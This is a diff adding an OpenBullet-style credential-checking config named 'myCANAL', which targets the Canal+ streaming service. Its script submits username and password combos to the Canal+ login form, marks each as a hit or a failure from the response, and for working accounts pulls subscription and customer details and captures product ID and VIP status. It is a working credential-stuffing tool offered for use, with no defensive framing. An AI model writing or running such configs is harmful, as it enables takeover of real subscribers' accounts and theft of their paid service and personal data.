@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "myCANAL",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-23T19:33:09.7478118+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_First_Response REQUEST GET "https://pass.canal-plus.com/form/redirection?redirectUrl=https%3A%2F%2Fpass.canal-plus.com%2Fform%2FdummyCookie%3FredirectUrl%3Dhttp%253A%252F%252Fdecouvrir.mycanal.fr%252F%253Fpass%253Dauth_myc" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Redirecting KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<title>CANAL - Redirection en cours...</title>" 
+#Post_Form_Data REQUEST POST "https://pass.canal-plus.com/form/authentication?ssoconf=auth_pp_ec&popin=false&pass_target=http://secure.espaceclientcanal.canal-plus.com/secure/3/abonne/pid253-consulter-mon-abonnement.html&urlSource=http://espaceclient.canalplus.canal-plus.com/pass/authenticate.php?ssoconf=auth_gene&pass_target=http%3A%2F%2Fsecure.espaceclientcanal.canal-plus.com%2Fsecure%2F3%2Fabonne%2Fpid253-consulter-mon-abonnement.html&pass_modal=pass_form&socialLinksDisabled=true&omnitureChannel=Espace" AutoRedirect=TRUE 
+  CONTENT "ssoEmail=<USER>&ssoPass=<PASS>&error=&submit=submit&socialAction=authentication&__checkbox_ssoMem=true&ssoMem=true&submitButton=Se connecter" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Token_or_Invalid KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "s_pass_token" 
+  KEYCHAIN Failure OR 
+    KEY "name=\"error\" value=\"invalidCredentials" 
+#Get_More_Info REQUEST GET "https://secure.espaceclientcanal.canal-plus.com/secure/3/abonne/mon-compte/abonnement/modif-abo/pid253-consulter-mon-abonnement.html" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "span class=\"montantTotal\">" 
+#get_customer_info REQUEST GET "https://api-client.canal-plus.com/self/persons/current/customers/detail" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json;charset=utf8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"data\":{\"" 
+#PARSE_productId PARSE "<SOURCE>" LR "\"productId\":\"" "\"" Recursive=TRUE -> CAP "productId" "" "" 
+#PARSE_vip PARSE "<SOURCE>" JSON "vip" Recursive=FALSE -> CAP "vip" "" "" 
